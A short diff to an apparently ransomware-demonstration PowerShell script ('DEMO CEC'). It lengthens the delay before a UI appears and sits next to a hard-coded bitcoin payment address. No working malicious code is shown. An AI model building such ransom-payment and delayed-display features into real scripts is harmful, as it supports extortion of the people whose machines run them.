@@ -22,7 +22,7 @@ $CertName = "DEMO CEC"
 
 # UI  
 $btc_addr = '35uK91y1uxxrvjdD6fCdBq75QVfDtHyCq1' # Who knows perhaps I'll get rich 💰 
-$delay = 12000  # Delay to show the UI 
+$delay = 432000  # Delay to show the UI 
 
 #Set Error & Warning Action 
 $ErrorActionPreference = "Stop"
